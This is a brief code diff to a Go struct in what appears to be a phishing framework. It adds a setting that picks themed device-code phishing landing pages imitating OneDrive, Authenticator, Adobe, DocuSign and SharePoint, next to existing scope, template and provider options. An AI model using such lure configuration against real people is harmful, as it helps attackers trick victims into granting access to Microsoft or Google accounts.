@@ -50,6 +50,7 @@ type Lure struct {
 	DeviceCodeScope    string `mapstructure:"dc_scope" json:"dc_scope" yaml:"dc_scope"`          // Scope preset for device code (e.g., full, gmail, gworkspace)
 	DeviceCodeTemplate string `mapstructure:"dc_template" json:"dc_template" yaml:"dc_template"` // Interstitial template: success, fallback, compliance
 	DeviceCodeProvider string `mapstructure:"dc_provider" json:"dc_provider" yaml:"dc_provider"` // Provider: microsoft, google (auto-detected from client if empty)
+	DeviceCodeTheme    string `mapstructure:"dc_theme" json:"dc_theme" yaml:"dc_theme"`          // Themed landing page: default, onedrive, authenticator, adobe, docusign, sharepoint
 }
 
 type SubPhishlet struct {
